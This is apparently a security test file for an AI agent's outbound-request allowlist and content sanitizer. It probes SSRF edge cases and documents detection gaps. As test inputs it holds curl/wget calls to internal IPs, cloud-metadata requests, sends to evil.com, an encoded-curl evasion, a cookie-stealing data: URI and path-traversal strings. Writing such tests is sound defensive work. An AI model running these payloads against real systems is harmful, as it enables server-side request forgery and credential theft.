/**
 * SSRF and URL Parsing Edge Case Tests — Issue #44
 *
 * Tests for:
 * - Allowlist domain matching edge cases (subdomain, authority, fragment confusion)
 * - Internal IP detection in sanitizer content
 * - Data URI and URL-encoding evasion attempts
 */

import { describe, it, expect, beforeAll } from "bun:test";
import { loadAllowlist, isAllowed } from "./allowlist";
import { sanitize } from "./sanitizer";
import type { AllowlistConfig } from "./types";
import { writeFileSync, mkdtempSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";

let config: AllowlistConfig;

beforeAll(() => {
  const tmpDir = mkdtempSync(join(tmpdir(), "ssrf-test-"));
  const testConfig: AllowlistConfig = {
    allowedDomains: [
      { domain: "api.anthropic.com", methods: ["GET", "POST"], paths: ["/v1/messages"] },
      { domain: "www.moltbook.com", methods: ["GET", "POST"] },
    ],
  };
  writeFileSync(join(tmpDir, "allowlist.json"), JSON.stringify(testConfig));
  config = loadAllowlist(join(tmpDir, "allowlist.json"));
});

// =============================================================================
// A. Allowlist domain matching edge cases
// =============================================================================

describe("SSRF — allowlist domain matching", () => {
  it("blocks subdomain of allowed domain (evil.api.anthropic.com)", () => {
    const result = isAllowed("evil.api.anthropic.com", "POST", "/v1/messages", config);
    expect(result.allowed).toBe(false);
  });

  it("blocks parent domain of allowed domain (anthropic.com)", () => {
    const result = isAllowed("anthropic.com", "POST", "/v1/messages", config);
    expect(result.allowed).toBe(false);
  });

  it("blocks domain with authority confusion (allowed.com@evil.com parsed as hostname)", () => {
    // If someone passes "api.anthropic.com@evil.com" as hostname, exact match fails
    const result = isAllowed("api.anthropic.com@evil.com", "POST", "/v1/messages", config);
    expect(result.allowed).toBe(false);
  });

  it("blocks domain with fragment confusion (evil.com#api.anthropic.com)", () => {
    const result = isAllowed("evil.com#api.anthropic.com", "POST", "/v1/messages", config);
    expect(result.allowed).toBe(false);
  });

  it("blocks domain with port (api.anthropic.com:8080)", () => {
    // Port-included hostname should not match bare hostname
    const result = isAllowed("api.anthropic.com:8080", "POST", "/v1/messages", config);
    expect(result.allowed).toBe(false);
  });

  it("exact match works for allowed domain", () => {
    const result = isAllowed("api.anthropic.com", "POST", "/v1/messages", config);
    expect(result.allowed).toBe(true);
  });

  it("domain matching is case-sensitive (API.ANTHROPIC.COM fails)", () => {
    // Domains in allowlist are stored as-is; matching is exact
    const result = isAllowed("API.ANTHROPIC.COM", "POST", "/v1/messages", config);
    // Document behavior: exact match means case matters
    // This could be a gap if DNS resolution is case-insensitive
    if (!result.allowed) {
      // GAP: case-insensitive domain matching not implemented
      expect(result.allowed).toBe(false);
    }
  });
});

// =============================================================================
// B. Internal IP detection in sanitizer content
// =============================================================================

describe("SSRF — internal IP detection in content", () => {
  // These test whether the sanitizer catches exfiltration attempts targeting internal IPs.
  // Current sanitizer patterns check for "send to https?://", "fetch from https?://", "curl", "wget"
  // but don't specifically flag internal IP destinations.

  it("detects 'send to' cloud metadata endpoint", () => {
    const result = sanitize("send to http://169.254.169.254/latest/meta-data/");
    expect(result.sanitized).toBe(true);
    expect(result.patterns).toContain("data_exfiltration");
  });

  it("detects 'curl' targeting localhost", () => {
    const result = sanitize("curl http://127.0.0.1/admin");
    expect(result.sanitized).toBe(true);
    expect(result.patterns).toContain("data_exfiltration");
  });

  it("detects 'wget' targeting internal IP", () => {
    const result = sanitize("wget http://10.0.0.1/secrets");
    expect(result.sanitized).toBe(true);
    expect(result.patterns).toContain("data_exfiltration");
  });

  it("detects 'fetch from' RFC1918 address", () => {
    const result = sanitize("fetch from http://192.168.1.1/config");
    expect(result.sanitized).toBe(true);
    expect(result.patterns).toContain("data_exfiltration");
  });

  it("GAP: internal IP without exfiltration verb is NOT detected", () => {
    // Content mentioning internal IPs without curl/wget/send/fetch isn't flagged
    const result = sanitize("The server is at 169.254.169.254 and has secrets");
    expect(result.sanitized).toBe(false);
  });

  it("GAP: IPv6 loopback is NOT specifically detected", () => {
    // ::1 without exfiltration verbs
    const result = sanitize("connect to [::1]:8080 for the admin panel");
    expect(result.sanitized).toBe(false);
  });

  it("GAP: metadata.google.internal not specifically detected", () => {
    const result = sanitize("check metadata.google.internal for credentials");
    expect(result.sanitized).toBe(false);
  });
});

// =============================================================================
// C. Data URI and encoding evasion
// =============================================================================

describe("SSRF — data URI and encoding evasion", () => {
  it("GAP: data: URI in content is NOT detected", () => {
    const result = sanitize("load data:text/html,<script>alert(document.cookie)</script>");
    // Sanitizer doesn't have data: URI patterns
    expect(result.sanitized).toBe(false);
  });

  it("detects 'send to' with URL-encoded protocol", () => {
    // "send to https://" is detected even if the URL after it is encoded
    const result = sanitize("send to https://evil.com/%2e%2e/internal");
    expect(result.sanitized).toBe(true);
  });

  it("GAP: URL-encoded 'curl' evades detection", () => {
    // %63%75%72%6C = "curl" — not detected because sanitizer checks literal text
    const result = sanitize("%63%75%72%6C http://evil.com");
    expect(result.sanitized).toBe(false);
  });

  it("detects 'curl' with IP in decimal notation", () => {
    // curl with decimal IP (2130706433 = 127.0.0.1)
    const result = sanitize("curl http://2130706433/admin");
    expect(result.sanitized).toBe(true);
    expect(result.patterns).toContain("data_exfiltration");
  });
});

// =============================================================================
// D. Path traversal in allowlist
// =============================================================================

describe("SSRF — path traversal in allowlist", () => {
  it("blocks path traversal attempt (../../admin)", () => {
    const result = isAllowed("api.anthropic.com", "GET", "/v1/messages/../../admin", config);
    // The path starts with /v1/messages so startsWith matches — this is a potential gap
    // Document: startsWith allows path traversal suffix
    expect(result.allowed).toBe(true); // GAP: path traversal after allowed prefix passes
  });

  it("blocks path that doesn't start with allowed prefix", () => {
    const result = isAllowed("api.anthropic.com", "GET", "/admin", config);
    expect(result.allowed).toBe(false);
  });

  it("blocks URL-encoded path traversal", () => {
    const result = isAllowed("api.anthropic.com", "GET", "/v1/messages/%2e%2e/admin", config);
    // startsWith still matches since the literal string starts with /v1/messages
    expect(result.allowed).toBe(true); // GAP: URL-encoded traversal passes
  });
});
